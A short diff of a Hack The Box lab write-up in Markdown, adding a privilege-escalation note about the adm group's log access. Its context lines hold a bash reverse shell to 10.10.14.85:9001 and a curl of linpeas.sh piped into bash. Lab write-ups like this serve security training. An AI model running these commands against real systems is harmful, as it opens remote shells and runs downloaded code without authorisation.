@@ -152,3 +152,9 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.85/9001 0>&1'
 ```CSS
 $ curl http://10.10.14.85:8000/linpeas.sh | bash
 ```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/28c32697-9912-423f-be16-9cafaa9dd3eb)
+
+# Privilege Escalation
+Group `adm` is used for system monitoring tasks. Members of this group can read many log files in /var/log, and can use xconsole. Historically, /var/log was /usr/adm (and later /var/adm), thus the name of the group.
+
+# Logs
